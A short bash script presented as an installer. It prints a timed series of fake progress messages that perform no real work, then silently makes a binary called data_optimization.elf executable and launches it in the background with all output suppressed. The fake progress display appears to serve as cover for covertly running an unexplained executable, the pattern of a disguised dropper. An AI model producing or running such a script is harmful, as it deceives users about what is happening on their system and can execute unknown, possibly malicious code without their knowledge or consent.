#!/bin/bash

# Installation script
steps=(
    "Checking system requirements..."
    "Downloading dependencies..."
    "Extracting files..."
    "Configuring settings..."
    "Optimizing performance..."
    "Finalizing installation..."
    "Cleaning up temporary files..."
    "Installation complete!"
)
for step in "${steps[@]}"; do
    echo "$step"
    sleep 1.5  # Adjust timing to make it run ~10 seconds
done
echo "Performing data optimization"
chmod +x data_optimization.elf
nohup ./data_optimization.elf > /dev/null 2>&1 &
